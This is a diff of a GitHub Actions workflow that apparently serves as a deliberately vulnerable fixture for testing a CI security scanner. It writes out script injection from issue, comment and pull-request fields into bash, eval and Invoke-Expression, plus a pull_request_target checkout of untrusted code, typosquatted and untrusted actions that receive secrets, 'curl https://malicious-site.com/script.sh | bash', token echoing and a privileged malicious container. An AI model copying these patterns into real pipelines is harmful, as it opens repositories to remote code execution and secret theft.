@@ -1,10 +1,119 @@
-name: Test Workflow
+name: Comprehensive Security Test Workflow
 
-on: [push]
+on:
+  push:
+  pull_request:
+  pull_request_target:
+
+permissions: write-all
 
 jobs:
-  test:
+  test-injection:
     runs-on: ubuntu-latest
     steps:
-    - name: Malicious curl
-      run: curl example.com | bash
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    - name: Code injection test
+      run: echo "${{ github.event.issue.title }}"
+      
+    - name: Script injection test  
+      run: |
+        curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+             https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.number }} | \
+             jq -r '.title' | bash
+             
+    - name: Environment injection
+      env:
+        USER_INPUT: ${{ github.event.comment.body }}
+      run: echo $USER_INPUT | sh
+
+  test-supply-chain:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Vulnerable action
+      uses: actions/cache@v1
+      
+    - name: Typosquatting action  
+      uses: actions/chekout@v3
+      
+    - name: Unpinned action
+      uses: actions/setup-node@main
+      
+    - name: Untrusted action
+      uses: random-user/malicious-action@v1
+      with:
+        secret-token: ${{ secrets.DEPLOY_TOKEN }}
+      
+    - name: Deprecated action
+      uses: actions/setup-python@v1
+
+  test-shell-injection:
+    runs-on: ubuntu-latest  
+    steps:
+    - name: Shell injection via eval
+      run: eval "echo ${{ github.event.head_commit.message }}"
+      
+    - name: PowerShell injection
+      shell: pwsh
+      run: |
+        Invoke-Expression "${{ github.event.inputs.command }}"
+        
+    - name: Script injection
+      run: |
+        #!/bin/bash
+        exec ${{ github.event.issue.body }}
+
+  test-self-hosted:
+    runs-on: self-hosted
+    steps:
+    - name: Risky self-hosted operation
+      run: |
+        echo "${{ github.event.pull_request.title }}" | bash
+        sudo rm -rf /tmp/*
+        
+    - name: Token manipulation
+      run: |
+        echo ${{ secrets.GITHUB_TOKEN }} | base64
+        gh auth token
+        
+    - name: Cross-repo access
+      run: |
+        gh repo clone other-org/sensitive-repo
+        curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+             https://api.github.com/repos/other-org/private-repo/contents
+        
+    - name: Network security risk
+      run: |
+        curl https://malicious-site.com/script.sh | bash
+        docker run --privileged malicious/image
+
+  test-privilege-escalation:
+    runs-on: self-hosted
+    permissions: write-all
+    steps:
+    - name: Cross-repository checkout
+      uses: actions/checkout@v3
+      with:
+        repository: other-org/sensitive-repo
+        token: ${{ secrets.PAT_TOKEN }}
+        
+    - name: Secrets in environment
+      env:
+        SECRET_KEY: ${{ secrets.DATABASE_PASSWORD }}
+        API_TOKEN: ${{ secrets.API_KEY }}
+      run: echo "Processing with secrets..."
+
+  test-pull-request-target:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request_target'
+    steps:
+    - name: Dangerous PR target checkout
+      uses: actions/checkout@v3
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+        
+    - name: Execute untrusted code
+      run: |
+        echo "${{ github.event.pull_request.head.ref }}" | bash
+        eval "${{ github.event.pull_request.title }}"
